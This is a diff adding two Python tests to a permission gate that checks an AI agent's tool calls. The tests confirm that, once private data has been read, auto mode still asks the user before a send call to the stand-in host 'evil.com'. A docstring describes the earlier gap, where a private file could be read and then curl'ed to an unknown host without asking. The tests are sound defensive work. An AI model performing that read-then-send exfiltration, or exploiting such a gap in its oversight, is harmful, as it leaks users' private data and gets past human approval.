@@ -415,6 +415,44 @@ async def test_gate_auto_mode_still_asks_on_tainted_egress(tmp_path: Path):
     assert asks(ui) == 2 and not result.ok
 
 
+async def test_gate_auto_mode_still_asks_on_tainted_egress_of_an_always_ask_tool(
+    tmp_path: Path,
+):
+    """The same taint rule holds for a tool in `always_ask_tools` (`shell`, `send_email`).
+    Step 5 used to run only when the decision so far was ALLOW, so for those tools it
+    never marked the ASK as tainted and auto mode waved it through: read a private file,
+    then `curl` it to an unknown host, with nothing asked."""
+    ui = ScopedUI(scope="once")
+    gate = Sentinel(
+        SentinelSettings(mode="auto", always_ask_tools=["sender"]),
+        AuditLog(tmp_path / "a.jsonl"),
+        ui,
+    )
+    # nothing private read yet: always_ask_tools asks, and auto mode skips that question
+    result = await gate.guard(call("sender", host="evil.com"), Sender())
+    assert asks(ui) == 0 and result.ok
+    # after private data entered the conversation, the same call asks, auto mode or not
+    await gate.guard(call("reader"), Reader())
+    result = await gate.guard(call("sender", host="evil.com"), Sender())
+    assert asks(ui) == 1 and result.ok
+    # declined, it does not run
+    ui.approve = False
+    result = await gate.guard(call("sender", host="evil.com"), Sender())
+    assert asks(ui) == 2 and not result.ok
+
+
+def test_taint_escalates_an_always_ask_decision_to_a_tainted_ask():
+    """Step 5 marks the ASK `tainted_ask` whatever set it, so the gate does not wave it
+    through in auto mode; before a taint rule with no warning on it was the one ASK that
+    auto mode still skipped."""
+    policy = Policy(SentinelSettings(mode="auto", always_ask_tools=["sender"]))
+    assessment = CallAssessment(risk=RiskLevel.SENSITIVE, egress=True, egress_target="evil.com")
+    plain = policy.evaluate("sender", {"host": "evil.com"}, assessment)
+    assert plain.decision == Decision.ASK and not plain.tainted_ask
+    tainted = policy.evaluate("sender", {"host": "evil.com"}, assessment, tainted=True)
+    assert tainted.decision == Decision.ASK and tainted.tainted_ask
+
+
 def test_grant_options_follow_muse_rules():
     sensitive_known = CallAssessment(risk=RiskLevel.SENSITIVE, egress=True, egress_target="x")
     assert Sentinel.grant_options(sensitive_known, "x") == [
